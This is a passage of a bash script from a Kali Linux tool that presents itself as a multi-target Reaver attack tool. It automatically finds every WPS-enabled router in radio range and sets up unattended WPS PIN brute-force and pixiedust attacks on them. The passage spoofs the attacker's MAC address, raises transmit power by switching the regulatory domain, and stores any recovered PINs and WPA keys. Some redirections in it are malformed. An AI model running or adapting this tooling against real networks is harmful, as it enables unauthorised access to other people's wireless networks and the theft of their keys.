inp="\e[1;36m"	    # input variables  magenta
yel="\e[1;33m"      # typed keyboard entries
ital="\e[3m"	    # italic
norm="\e[0m"        # normal
bold="\e[1m"        # bold
undr="\e[4m"        # underline
#  ANSI coding all thanks to Vulpi author of Pwnstar9.0

################################
# Activate when Eterm works in kali2.0 currently doesnot function

#~~~~~~~~~Start Check For Install Start~~~~~~~~~~#
CHK_INST_fn()
{
echo ""
echo ""
echo -e "$info Checking for the installation of Eterm."
echo -ne "Eterm............."

	if ! hash Eterm  2>/dev/null; then

		echo -e "$warn    !!!Eterm May Not Be installed!!!$txtrst"
		echo -e "$info  Install Eterm before continuing"
		echo -e "$info  If Eterm not installed get an internet connection and type;"
		echo -e "$txtrst  apt-get install Eterm"
		sleep 5
                
	else

		echo -e "$yel  Eterm is Installed OK!$txtrst"
		sleep 2
	fi


echo -e "$info Checking for the installation of awk."
echo -ne "Awk............."
	if ! hash awk 2>/dev/null; then

		echo -e "$warn     Awk may not be installed $txtrst"
		echo -e "$warn Install awk before continuing!"
		sleep 5
                
	else

		echo -e "$yel OK awk is installed!$txtrst"
		sleep 2
	fi

#Another way to do this
#hash Eterm &> /dev/null

#       if [[ $? -ne 0 ]] ;then  # checks exit code of last command ie did it work?
#            echo -e "$warn\n???!!!Eterm MAY NOT BE Installed!!!???"
#            echo -e "$inp Insure Eterm is installed before continuing"
#            sleep 5
#        else 
#            echo -e "$inp OK Eterm is installed!$txtrst""
#            sleep 5
#        fi
}
#~~~~~~~~~End Check For Install End~~~~~~~~~~#

clear
echo ""
echo -e "$txtrst varmacscan-K1-2-2017-8-4.sh"
echo ""
echo -e "$yel              ***********************************************"
echo -e "$yel              *$info Musket Team Multi-Target Reaver Attack Tool$yel *"
echo -e "$yel              ***********************************************"
echo ""
echo -e "$warn                     !!!!FOR USE WITH KALI-LINUX!!!!"
echo ""
echo -e "$info              Program supports  automatic multi-target  aquisition"
echo -e "$info              and focused reaver attacks against all targets found."
echo -e "$info              Script is designed to be completely fire and  forget."       
echo""
echo -e "$info                   Supports kali 1.1, 2.0, 2016 R, and 2017 R"
echo -e "$info     If kali 1.1 is used$yel uncheck Enable Networking$info thru Network Manager"  
echo -e "$info   drop down  menu, upper right-hand corner of screen. Ensure$yel Enable Wire-"
echo -e "$info   less$info is selected,  or a RF kill error may result."   
echo -e "$info     Program is designed to slowly collect WPS pins from routers"  
echo -e "$info  which provide a small number of WPS pins and then lock. During the"
echo -e "$info  attack, the program will attempt to extract the WPS PiN using"
echo -e "$info  pixiewps. This allows the user to quickly check ALL WPS enabled"
echo -e "$info  routers within reception range for the susceptibiliy to a pixiedust"
echo -e "$info  attack automatically."
echo -e ""
echo -e "$info     This work is dedicated to$yel Clif High$info. May his insights into the"
echo -e "$info  future thru predictive linguistics continue to intrigue us."

echo -e "$inp     All thanks to$yel brunoaduarte$inp and$yel squash$inp kali-linux forums"
echo -e "$inp for the help provided."

while true

do
echo -e "$inp                              Press $yel(y/Y)$inp to continue...."
echo -e "         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst"

  read CONFIRM
  case $CONFIRM in
    y|Y|YES|yes|Yes) break ;;
    n|N|no|NO|No)
      echo Aborting - you entered $CONFIRM
      exit
      ;;

	  esac

		done

echo -e "$info  You entered $CONFIRM.  Continuing ...$txtrst"
sleep 3

clear

#Test for ifconfig type ext output
IFCONFIG_TYPE_fn
# Clears bug with essidprobe variation with airodump-ng in 1.1 and 2.0

KALI_L_fn
REAVERSEL_fn
REVPIXSEL_fn
USEAIR_OLD_fn
#
# Allows use of airmon-ng check kill if required by OS

onlyonce=0

DEVTEST=ZZZ

#Make dir to test for WPS/WPA key

if [ ! -d "/root/VARMAC_LOGS" ]; then

	mkdir -p -m 700 /root/VARMAC_LOGS;

	fi

#Make dir to hold both white listed files and WPS/WPA keys

if [ ! -d "/root/VARMAC_WHITELST" ]; then

    mkdir -p -m 700 /root/VARMAC_WHITELST;

	fi

#Make dir to hold WPS/WPA keys

if [ ! -d "/root/VARMAC_WPSWPA" ]; then

    mkdir -p -m 700 /root/VARMAC_WPSWPA;

	fi

if [ ! -d "/root/PROBEESSID_DATA" ]; then

	mkdir -p -m 700 /root/PROBEESSID_DATA;

	fi

if [ ! -f "/root/PROBEESSID_DATA/essidprobesdic.txt" ]; then

	touch /root/PROBEESSID_DATA/essidprobesdic.txt

	fi

if [ ! -f "/root/PROBEESSID_DATA/essidrefhold.txt" ]; then

	touch /root/PROBEESSID_DATA/essidrefhold.txt

	fi

if [ ! -d "/tmp/ESSIDPROBE_DIR" ]; then

	mkdir -p -m 700 /tmp/ESSIDPROBE_DIR;

	fi

rm -f /tmp/ESSIDPROBE_DIR/*


countcsv=`ls -1 /root/*.csv 2>/dev/null | wc -l`


	if [[ $countcsv != 0 ]]; then


	cp -f /root/*.csv /tmp/ESSIDPROBE_DIR/


		fi

rm -f /tmp/ESSIDPROBE_DIR/*.kismet.csv

cat /root/PROBEESSID_DATA/essidprobesdic.txt >> /tmp/ESSIDPROBE_DIR/allcsv.txt


SELECT_DEVICE_fn()
{

until  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do
clear
echo ""
echo -e "$txtrst  Standby Program is Loading......"
echo ""

	if [[ $AIROLD == y || $AIROLD == Y  ]]; then

		airmon-old_fn | cat > /tmp/airmontype.txt

		else

		airmon-ng | cat > /tmp/airmontype.txt

			fi

	#airmon-ng | cat > /tmp/airmontype.txt

airmontype=$(cat < /tmp/airmontype.txt | awk -F' ' '{ if(($2 == "Interface")) {print $2}}')

if [[ "$airmontype" != "Interface"  ]]; then

#      airmontype=ZZZ
      airmon-ng stop mon10 &>dev\null
      airmon-ng stop mon9 &>dev\null
      airmon-ng stop mon8 &>dev\null
      airmon-ng stop mon7 &>dev\null
      airmon-ng stop mon6 &>dev\null
      airmon-ng stop mon5 &>dev\null
      airmon-ng stop mon4 &>dev\null
      airmon-ng stop mon3 &>dev\null
      airmon-ng stop mon2 &>dev\null
      airmon-ng stop mon1 &>dev\null
      airmon-ng stop mon0 &>dev\null
      airmon-ng stop wlan10mon  &>dev\null
      airmon-ng stop wlan9mon  &>dev\null
      airmon-ng stop wlan8mon  &>dev\null
      airmon-ng stop wlan7mon  &>dev\null
      airmon-ng stop wlan6mon  &>dev\null
      airmon-ng stop wlan5mon  &>dev\null
      airmon-ng stop wlan4mon  &>dev\null
      airmon-ng stop wlan3mon  &>dev\null
      airmon-ng stop wlan2mon  &>dev\null
      airmon-ng stop wlan1mon  &>dev\null
      airmon-ng stop wlan0mon  &>dev\null

	fi

 if [[ "$airmontype" == "Interface" ]]; then

      airmon-ng stop mon10 &>dev\null
      airmon-ng stop mon9 &>dev\null
      airmon-ng stop mon8 &>dev\null
      airmon-ng stop mon7 &>dev\null
      airmon-ng stop mon6 &>dev\null
      airmon-ng stop mon5 &>dev\null
      airmon-ng stop mon4 &>dev\null
      airmon-ng stop mon3 &>dev\null
      airmon-ng stop mon2 &>dev\null
      airmon-ng stop mon1 &>dev\null
      airmon-ng stop mon0 &>dev\null
      airmon-ng stop wlan10mon  &>dev\null
      airmon-ng stop wlan9mon  &>dev\null
      airmon-ng stop wlan8mon  &>dev\null
      airmon-ng stop wlan7mon  &>dev\null
      airmon-ng stop wlan6mon  &>dev\null
      airmon-ng stop wlan5mon  &>dev\null
      airmon-ng stop wlan4mon  &>dev\null
      airmon-ng stop wlan3mon  &>dev\null
      airmon-ng stop wlan2mon  &>dev\null
      airmon-ng stop wlan1mon  &>dev\null
      airmon-ng stop wlan0mon  &>dev\null

echo -e  "$txtrst"

	if [[ $AIROLD == y || $AIROLD == Y  ]]; then

		airmon-old_fn | tee airmon01.txt

		else

		airmon-ng | tee airmon01.txt

			fi

	#airmon-ng | tee airmon01.txt 

cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi

if [[ "$airmontype" != "Interface" ]]; then

echo -e  "$txtrst"


	if [[ $AIROLD == y || $AIROLD == Y  ]]; then

		airmon-old_fn | tee airmon01.txt

		else

		airmon-ng | tee airmon01.txt

			fi

#airmon-ng | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt


#cat < airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > airmon02.txt

#cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $2}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

		fi

echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$inp     Enter the$yel line number$inp of the wireless device$yel (i.e. wlan0, wlan1 etc)$inp"
echo -e "  to be used."
echo -e "$warn  Device must support packet injection.$txtrst"
echo ""
read  -p "  Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
DEV=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

DEV=$(echo $DEV | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	while true
	do

echo ""
echo -e "$inp  You entered$yel $DEV$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

clear

}

#~~~~~~~~~~~~~~~End Select Device End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Boost Device~~~~~~~~~~~~~~~#

BOOST_DEVICE_fn()
{
ifconfig $DEV down
sleep .1
iwconfig $DEV mode managed
sleep .1
ifconfig $DEV up

clear
	while true
	do

echo ""
echo -e "$q    Do you wish to boost your wifi device power to 30dBm?"
echo -e "$info  This routine works for the AWUSO36H and" #(AWUSO)
echo -e "$info  may work with other devices."
echo -e "$inp  Type$yel (y/Y)$inp for yes or$yel (n/N)$inp for no.$txtrst"
		read AWUSO
		case $AWUSO in
		y|Y|n|N) break ;;
		~|~~)
		echo Aborting -
		exit
		;;

		esac
		echo -e  "$warn !!!Wrong input try again!!!$txtrst"

			done

	if [ $AWUSO == y ] || [ $AWUSO == Y ]; then

		ifconfig $DEV down
		sleep 1
		iw reg set GY
		ifconfig $DEV up
		iwconfig $DEV channel 13
		iwconfig $DEV txpower 30

        	sleep 2
 
			fi

clear

}

#~~~~~~~~~~~~~~~End Boost Device End~~~~~~~~~~~~~~~#

ERASE_REVDIR_fn

SELECT_DEVICE_fn

if [[ "$airmontype" != "Interface" ]]; then

SELECT_MONITOR_fn

	fi

if [[ $KALI_TYPE -eq 2 || $KALI_TYPE -eq 3 ]]; then

	CHECK_KILL_fn

	fi

WPSLOCKSEL_fn

clear

COUNTTEST=ZZZ

until  [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  
clear
echo ""
echo -e "$q  How many times do you want the program to cycle thru the targetAPs?"
echo ""
echo -e "$warn     !!!!Enter a number less then 100,000!!!!$txtrst"
read COUNT

while  [ $COUNT -gt 99999 ]; do
        echo -e "$warn  !!!Please enter a number less than 100,000!!!"
	echo -e "$q     How many times do you want the program to cycle thru all targetAPs?(COUNT)$txtrst"
      	read COUNT

	done

while true

	do

echo ""
echo -e "$inp  You entered$yel $COUNT$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
	read COUNTTEST

	case $COUNTTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

#white_ap_mac_fn

let COUNTSTART=$COUNT

BOOST_DEVICE_fn

MANUAL_SELECT_fn

PIN_SELECT_fn

STIM_SELECT_fn

FN=0

let COUNTSTART=$COUNT #Set real count before entering loop
let COUNT=$COUNT+1  # add  before entering the loop

prepare_fn()

{

let COUNT=COUNT-1
let FN=FN+1

echo -e "$txtrst" 

if [ $COUNTSTART -lt 1000 ]; then

	PAD=`printf "%03d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%03d\n" $PF`
		fi	
			fi

if [ $COUNTSTART -gt 999 ] && [ $COUNTSTART -lt 10000 ]; then

	PAD=`printf "%04d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%04d\n" $PF`
		fi
			fi

if [ $COUNTSTART -gt 9999 ] && [ $COUNTSTART -lt 100000 ]; then

	PAD=`printf "%05d\n" $FN`
	if [ $FN -gt 1 ]; then
   	let PF=FN-1
   	CF=`printf "%05d\n" $PF`
		fi

			fi

echo -e "$txtrst"
DATEFILE=$(date +%y%m%d-%H:%M)

#$TARGETAP1-$DATEFILE-$PAD Note hours and min added to avoid overwrite
clear

if  [[  $COUNTSTART == $COUNT ]] && [[ $ROUTSEL == y || $ROUTSEL == Y  || $WHITEL == y || $WHITEL == Y ]]; then

echo  ""
echo -e "$txtrst"
echo -e "[+] ********** Starting Pre Wash Scans **********"
echo -e "[+] *******Automatic Mode Has Not Started*******"
echo -e "[+]      Further Program Prompts to Follow"

		fi

echo  ""
echo -e "[+]  Any Networks whitelisted are not attacked"
echo -e "[+]  see /root/VARMAC_WHITELST"
echo -e "[+]  for whitelisted networks"
echo -e "[+]  ESSIDPROBES are stored in the"
echo -e "[+]  /root/PROBEESSID_DATA folder"
echo -e "[+]"
echo -e "[+]     You can use ctrl+c at anytime"  
echo -e "[+]  to terminate the program." 
sleep 2

if [ "$airmontype" == "Interface" ]; then

monitor="$DEV"mon

sleep 2

	if  [[  $COUNTSTART == $COUNT ]] && [[ $USECKILL == y || $USECKILL == Y ]] &&  [[ $KALI_TYPE -eq 2 || $KALI_TYPE -eq 3 ]]; then

echo -e "[+]"
echo -e "[+] Running airmon-ng check kill"
echo -e "[+] Removing NetworkManager functions"
echo -e "[+] "
echo -e "[+] NetworkManager will be restored"
echo -e "[+] at program termination"
echo -e "[+]" 


	airmon-ng check kill &>dev\null # kill process

		fi

	fi

if [[ "$airmontype" != "Interface" ]]; then

monitor=$MON
sleep 2

	fi

sleep 2

ifconfig $DEV up

if [[ "$airmontype" == "Interface" ]]; then

echo -e "[+] Putting $DEV in monitor mode @ $monitor." # notify monitor mode
sleep 3

	ifconfig $DEV down  
	macchanger -A $DEV &>dev\null
	sleep 2 # give op time to complete
	ifconfig $DEV up

		if [[ $ifselect == old ]]; then
	
            VARMAC=$(ifconfig $DEV | awk '{print $5}')
            sleep 0.5
            VARMAC=$(echo $VARMAC | awk '{print $1}')
	
			fi

		if [[ $ifselect == new ]]; then
	
VARMAC=$(ifconfig $DEV | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null
	

		fi

	airmon-ng start $DEV &>dev\null # start monitor mode on interface

	echo "[+] Spoofing with random mac address."
	ifconfig $monitor down  
	macchanger -m $VARMAC $monitor &>dev\null
	sleep 2 # give op time to complete
	ifconfig $monitor up

		if [[ $ifselect == old ]]; then

            VARMAC=$(ifconfig $monitor | awk '{print $5}')

            sleep 0.5
            VARMAC=$(echo $VARMAC | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

VARMAC=$(ifconfig $monitor | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi

            sleep 1

VARMAC=$(echo $VARMAC | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | 
	sed -r 's/[-]+/:/g') # limit to 17 in length and replace - with :

		fi

if [[ "$airmontype" != "Interface" ]]; then

	ifconfig $DEV down
        iwconfig $DEV mode manage
	ifconfig $DEV up
	ifconfig $DEV down
	macchanger -m $VARMAC $DEV &>dev\null
	sleep 2  # give time for op
	ifconfig $DEV up 

		if [[ $ifselect == old ]]; then

            VARMAC=$(ifconfig $DEV | awk '{print $5}')

            sleep 0.5
            VARMAC=$(echo $VARMAC | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

VARMAC=$(ifconfig $DEV | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi

           sleep 1

 VARMAC=$(echo $VARMAC | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g') # limit to 17 in length and replace - with :

	sleep 1
	ifconfig $monitor down &>dev\null
	iwconfig $monitor mode manage
	macchanger -m $VARMAC $monitor &>dev\null
	sleep 2  # give time for op
	ifconfig $monitor up &>dev\null
echo -e "[+] Putting $monitor in monitor mode @ $monitor" # notify monitor mode
#######
	ifconfig $DEV down
	sleep 1
	iwconfig $DEV mode monitor
	sleep 1
	ifconfig $DEV up
#######

	ifconfig $monitor down &>dev\null
	iwconfig $monitor mode monitor &>dev\null
	ifconfig $monitor up &>dev\null



	if  [[  $COUNTSTART == $COUNT ]] && [[ $USECKILL == y || $USECKILL == Y ]] &&  [[ $KALI_TYPE -eq 2 || $KALI_TYPE -eq 3 ]]; then

echo -e "[+]"
echo -e "[+] Running airmon-ng check kill"
echo -e "[+] Removing NetworkManager functions"
echo -e "[+] "
echo -e "[+] NetworkManager will be restored"
echo -e "[+] at program termination"
echo -e "[+]" 


	airmon-ng check kill &>dev\null # kill process

		fi

		fi

ROUTER_SELECT_fn()
{

ROUTSELTEST=ZZZ

		if [[ $onlyonce == 0 ]]; then   #trap out after setup

echo -e "$txtrst"
echo -e "[+] Running wash pre-scan."

if [[ $ROUTSEL == y  || $ROUTSEL == Y ]] ||  [[ $WHITEL == y || $WHITEL == Y ]]; then

#xterm -g 100x30-1+1 -T "wash prescan" -e "wash -i $monitor 2>&1 | tee /tmp/wash01.txt" &

#Eterm -g 100x30-1+1 --cmod "red" --no-cursor  -T "Wash Prescan" -e sh -c "wash -i $monitor 2>&1 | tee /tmp/wash01.txt" &


	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 100x30-1+1 -T "wash prescan" -e "wash -i $monitor -C 2>&1 | tee /tmp/wash01.txt" &

			fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 100x30-1+1 -T "wash prescan" -e "wash -i $monitor 2>&1 | tee /tmp/wash01.txt" &

			fi

		fi

	if [ $ROUTSEL == y ] || [ $ROUTSEL == Y ]; then 

MACSIXTEST=ZZZ

until [ $MACSIXTEST == y ] || [ $MACSIXTEST == Y ]; do
clear
echo -e ""
echo -e "       Enter the first six(6) hex characters of the router model"
echo -e "  you wish to attack with reaver."
echo -e "       !!!ALL other WPS enabled network will be ignored!!!"
echo -e ""
echo -e "       To capture the first six(6) hex characters of the mac address" 
echo -e "  from airodump-ng in the xterm window hold down the left mouse button"
echo -e "  and drag across the mac address then click the mouse button once to"
echo -e "  capture to the clipboard."
echo -e ""
echo -e "  Use mouse insert or shift insert to paste data at cursor position" 
echo -e ""		
echo -e "$inp     To attack only a specific router model enter the first six(6)"
echo -e "   hexidecimal digits in the following format ONLY ie 55:44:33:$txtrst"

read MACSIX

while true

	do

echo ""
echo -e "$inp  You entered$yel $MACSIX$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"

	read MACSIXTEST

	case $MACSIXTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

		if [[ ${#MACSIX} != 9 ]]; then

		echo -e ""
		echo -e "$info  Try again" 
		echo -e "$warn  The mac address $MACSIX entered is of incorrect length!!!"
		echo -e "$inp  Enter only the first six(6) hex digits and colon seperators"
		echo -e "$inp  in the following format$yel 55:44:33:$inp ONLY"
		killall -q wash &>dev\null
		sleep 1
		killall -q xterm &>dev\null
		MACSIX=
		sleep 3
		ROUTER_SELECT_fn
		
			fi

MACSIX=$(echo $MACSIX | awk '{print toupper($0)}')


			fi

white_ap_mac_fn

killall -q wash &>dev\null
sleep 1
killall -q xterm &>dev\null
#killall -q Eterm &>dev\null
				fi #onlyonce

}

ROUTER_SELECT_fn

killall -q wash &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
#killall -q Eterm &>dev\null
onlyonce=1   # trap out
#########WASH TARGET SCAN##############
echo -e "$txtrst"
echo -e "[+]  *************************************"

	if  [[ $COUNTSTART == $COUNT ]]; then

clear
echo -e ""
echo -e "[+]  ****** Entering Automatic Mode ******"
echo -e "[+]   No Further Input From User Required"

			fi

echo -e "[+] Running wash scan searching for WPS enabled Networks."


xterm -g 80x15-1+280 -T "Airodump-ng Passive Scan" -e "airodump-ng --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/allchan $monitor" 2> /dev/null &



sleep 2

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 100x30-1+1 -T "wash target scan" -e "wash -i $monitor -C 2>&1 | tee /tmp/wash01.txt" &

			fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 100x30-1+1 -T "wash target scan" -e "wash -i $monitor 2>&1 | tee /tmp/wash01.txt" &

			fi



#Eterm -g 100x20-1+1 --cmod "red" --no-cursor  -T "Wash Target Scan" -e sh -c "wash -i $monitor 2>&1 | tee /tmp/wash01.txt" &

sleep 2

#xterm -g 80x15-1+280 -T "Airodump-ng Passive Scan" -e "airodump-ng --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/allchan $monitor" 2> /dev/null &

#Eterm -g 80x15-1+280 --cmod "red" --no-cursor  -T "Airodump-ng Scan" -e sh -c "airodump-ng --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/allchan $monitor" &

# Need wash scan ime length = set at program sart

#Debug Add time length of wash scan as a variable  

echo -e ""
echo -e "[+] See /root/VARMAC_WPSWPA/"
echo -e "[+] For any WPS Pins or WPA Keys found"
echo -e ""
echo -e "[+] Time before program restart"
seconds=$washtime; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$yel    $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done
sleep 1

echo -e "$txtrst"

killall -q wash &>dev\null
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
#killall -q Eterm &>dev\null

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then

		ESSIDPROBE_fn

		fi

	if [[ $USE_REF == y || $USE_USE_REF == Y ]]; then

		ESSIDREF_fn

		fi

echo -e "$txtrst"

# Remove all targets except mac fragment as selected else all.
#Decide to attack locked routers


	if [[ $LOCK_SEL == y || $LOCK_SEL == Y ]] && [[ $ROUTSEL == y || $ROUTSEL == Y ]]; then

#MACSIXAWK=/$MACSIX/

MACSIXAWK=$MACSIX

MACSIXAWK=$(echo $MACSIXAWK | sed -e  's/^\(.\{9\}\).*$/\1/' | sed -r 's/[-]+/:/g')

cat < /tmp/wash01.txt | awk -F' ' '{ if(($5 == "No") || ($5 == "Yes")) {print $1 " " $2 " " substr($0, index($0,$6))}}' > /tmp/wash01a.txt
sleep 2
cat < /tmp/wash01a.txt | awk -v macsix="$MACSIXAWK" '{ if(( substr($1, 0, 10) == macsix )){ print $0 }}' | cat > /tmp/wash02.txt
sleep 2
			fi

#Decide to attack only unlocked routers

	if [[ $LOCK_SEL == n || $LOCK_SEL == N ]] && [[ $ROUTSEL == y || $ROUTSEL == Y ]]; then

#MACSIXAWK=/$MACSIX/

MACSIXAWK=$MACSIX

MACSIXAWK=$(echo $MACSIXAWK | sed -e  's/^\(.\{9\}\).*$/\1/' | sed -r 's/[-]+/:/g')


cat < /tmp/wash01.txt | awk -F' ' '{ if(($5 == "No") || ($5 == "No")) {print $1 " " $2 " " substr($0, index($0,$6))}}' > /tmp/wash01a.txt

sleep 2

cat < /tmp/wash01a.txt | awk -v macsix="$MACSIXAWK" '((substr($1, 0, 10)) == macsix) {print  $0 }' > /tmp/wash02.txt

sleep 2

			fi

if [[ $LOCK_SEL == n || $LOCK_SEL == N ]] && [[ $ROUTSEL == n || $ROUTSEL == N ]]; then

cat < /tmp/wash01.txt | awk -F' ' '{ if(($5 == "No") || ($5 == "No")) {print $1 " " $2 " " substr($0, index($0,$6))}}' > /tmp/wash02.txt

fi

if [[ $LOCK_SEL == y || $LOCK_SEL == Y ]] && [[ $ROUTSEL == n || $ROUTSEL == N ]]; then

cat < /tmp/wash01.txt | awk -F' ' '{ if(($5 == "No") || ($5 == "Yes")) {print $1 " " $2 " " substr($0, index($0,$6))}}' > /tmp/wash02.txt

fi

cat < /tmp/wash02.txt | awk -F' ' '{print $1}' | sed -e 's/^\(.\{17\}\).*$/\1/' > /tmp/MAC_LIST.txt

cat < /tmp/wash02.txt | awk -F' ' '{print $2}' > /tmp/CHANNEL_LIST.txt

#test Print all from three

#remove white space from left of first word & replace spaces with underscore for variables

if [[ $REVPIX_TYPE == 1 ]]; then

cat < /tmp/wash02.txt | awk -F' ' '{$1=$2=""; print $0 }' | sed -e 's/^[ \t]*//' | sed -e 's/ /_/g' > /tmp/APNAME_LIST.txt

	fi


#Change 8 Skip Vendor

if [[ $REVPIX_TYPE == 2 ]]; then

cat < /tmp/wash02.txt | awk -F' ' '{$1=$2=$3=""; print $0 }' | sed -e 's/^[ \t]*//' | sed -e 's/ /_/g' > /tmp/APNAME_LIST.txt

	fi

#cat < /tmp/wash02.txt | awk -F' ' '{$1=$2=""; print $0 }' | sed -e 's/^[ \t]*//' | sed -e 's/ /_/g' > /tmp/APNAME_LIST.txt

#cat < /tmp/wash02.txt | awk -F' ' '{print $3" "$4" "$5" "$6" "$7}' > /tmp/APNAME_LIST.txt

#ESSID Awk Module make variable

#cat < /tmp/HANDTEST/iwscan01.txt | awk -F ' ' '{if (($1 == "SSID:") || ($1 == "WPA:")) { print $0 }}' > /tmp/HANDTEST/iwessid02.txt

# Make var

SSIDS=$(cat < /tmp/APNAME_LIST.txt | awk '{ print $0 }' | sed -r 's/[-]+/:/g')


BSSIDS=$(cat < /tmp/MAC_LIST.txt | awk '{ print $1 }' | sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g' )

#CHANNEL AWK Module Strip out non WPA make var

CHANN=$(cat < /tmp/CHANNEL_LIST.txt | awk '{ print $1 }' | sed -r 's/[-]+/:/g' )

# Correct bug in logic that provides 1 when variable is empty when wc -l used with variable. There r otherways to do this but this works. 

	if [[ ! -z $SSIDS ]]; then

		number1=$(echo -e "$SSIDS" | wc -l)

		else

		SSID=0

		fi

	if [[ ! -z $BSSIDS ]]; then

		number2=$(echo -e "$BSSIDS" | wc -l)

		else

		BSSIDS=0

		fi

	if [[ ! -z $CHANN ]]; then

		number3=$(echo -e "$CHANN" | wc -l)

		else

		CHANN=0

		fi

#gives false one see above
#number1=$(echo -e "$SSIDS" | wc -l)
#number2=$(echo -e "$BSSIDS" | wc -l) # get number of networks
#number3=$(echo -e "$CHANN" | wc -l)

#number1=$(expr "$number1" - 1)
#number2=$(expr "$number2" - 1)
#number3=$(expr "$number3" - 1)

numi1=$number2 # important for the loop

#Leave to Debug in future
clear
#echo "number1=$number1  SSIDS" 
#echo "number2=$number2  BSSIDS"
#echo "number3=$number3  CHANN"

echo  " "
echo -e "$txtrst"
echo "[+] **************************"
echo "[+] WPS Enabled Networks Found"
echo "[+]      Are Listed Below     "
echo "$SSIDS" 
#echo "BSSIDS=$BSSIDS"
#echo "CHANN=$CHANN"


# Look for unsuccessful scan

	if [[ -z $number1 ]]; then

		echo -e "[+] No WPS Networks Seen scanning again."
		sleep 3
		prepare_fn

		fi

if [[ $number1 == $number2  &&  $number1 == $number3  ]]; then


#  if [ $number1 -eq 1 ]; then

#	echo -e "[+] Scan Successful $number1 WPS enabled Network Seen."

#		fi

#if [ $number1 -gt 0 ]; then

	echo -e "[+] Scan Successful $number1 WPS enabled Networks Seen."

#		fi

	echo -e "[+] Standby program is loading.............."
			sleep 2
	echo -e "[+]"

	else 

        echo -e "[+] Scan unsuccessful trying again."


		fi	  

number_of_files=$(ls -A /root/VARMAC_WHITELST/ | wc -l)

if [ "$number_of_files" > 0 ]; then

#ls -1 /root/VARMAC_WHITELST/* | sed 's/-.*//' | awk '{a [$1]++}! (a[$1]-1)' | awk 'BEGIN { FS ="/" } ; { print $4 }' | cat > /tmp/HANDTEST/caplist.txt 2> /dev/null

#ls -1 /root/VARMAC_WHITELST/* | xargs -n1 basename | sed 's/-.*//' | awk '{a [$1]++}! (a[$1]-1)' | cat > /tmp/caplist.txt 2> /dev/null

ls -1 /root/VARMAC_WHITELST/ | cat > /tmp/caplist1.txt 2> /dev/null

 cat < /tmp/caplist1.txt | sed 's/-.*//' | awk '{a [$1]++}! (a[$1]-1)' | cat > /tmp/caplist.txt

# Place in array

sleep 2

readarray bssidcaplist < /tmp/caplist.txt

# Start array search at zero

	fi

attack_fn

}

attack_fn() 

{

#reset variables
#Reset wpa keyfound variable so skip all test if pin found
WPAYUU=

killall -q wash &>dev\null
sleep .5
PIDREV1=$(pgrep reaver)
kill -s SIGINT $PIDREV1 &>dev\null 
sleep .5
killall -q airodump-ng &>dev\null
sleep .5
killall -q aireplay-ng &>dev\null
sleep .5
killall -q xterm &>dev\null
#killall -q Eterm &>dev\null
sleep .5
killall -q tee &>dev\null

if  [[ $numi1 == 0 ]]; then
	
	echo -e "[+] No WPS Enabled Networks Seen or Remaining."
	echo -e "[+] Rescanning....."
	sleep 3 
	prepare_fn

		fi

if  [[  $numi1 > 0 ]]; then 

	bssidvar=0
	whitelist_test

	    fi
                                                                   
